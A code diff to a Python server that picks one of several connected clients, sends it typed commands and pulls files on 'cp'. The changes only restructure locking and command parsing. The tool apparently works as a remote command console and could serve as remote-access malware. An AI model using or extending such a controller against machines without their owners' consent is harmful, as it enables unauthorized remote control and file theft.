@@ -63,12 +63,12 @@ class Server:
             elif option == "2":
                 client_id = input("Choose wisely: ")
                 os.system('clear')
-                with self.locking:
-                    try:
+                try:
+                    with self.locking:
                         client = self.connections[int(client_id)]
-                        FileBrowser(client).run()
-                    except IndexError:
-                        print("Index does not exist. \n")
+                    FileBrowser(client).run()
+                except IndexError:
+                    print("Index does not exist. \n")
             elif option == "0":
                 self.close_connections()
                 sys.exit(0)
@@ -116,8 +116,7 @@ class FileBrowser:
                 os.system("clear")
             else:
                 self.client[0].sendall(bytes(command, "UTF-8"))
-                aux = command.split("~")
-                if aux[0] == "cp":
+                if command.startswith("cp"):
                     self.file_transfer()
                 received = self.client[0].recv(4096).decode("UTF-8")
                 print(received)
